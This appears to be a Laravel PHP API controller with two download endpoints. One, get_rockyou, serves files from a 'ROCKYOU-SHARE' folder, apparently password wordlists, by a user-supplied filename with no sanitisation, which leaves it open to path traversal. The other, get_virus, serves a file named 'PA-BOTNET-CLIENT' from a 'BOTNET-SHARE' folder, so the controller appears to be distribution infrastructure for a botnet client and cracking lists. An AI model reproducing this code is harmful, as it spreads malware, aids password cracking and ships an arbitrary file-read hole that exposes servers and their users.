<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class ApiController extends Controller
{
    public function get_rockyou(Request $request)
    {
        $filename = $request->file;

        $filePath = storage_path("ROCKYOU-SHARE/".$filename);

        if (file_exists($filePath)) {

            return response()->download($filePath);
        } else {
            // Retourner une réponse d'erreur si le fichier n'existe pas
            return response()->json(['error' => 'File not found'], 404);
        }
    }

    public function get_virus()
    {

        $filePath = storage_path("BOTNET-SHARE/PA-BOTNET-CLIENT");

        if (file_exists($filePath)) {
            return response()->download($filePath);
        } else {
            return response()->json(['error' => 'File not found'], 404);
        }
    }




}
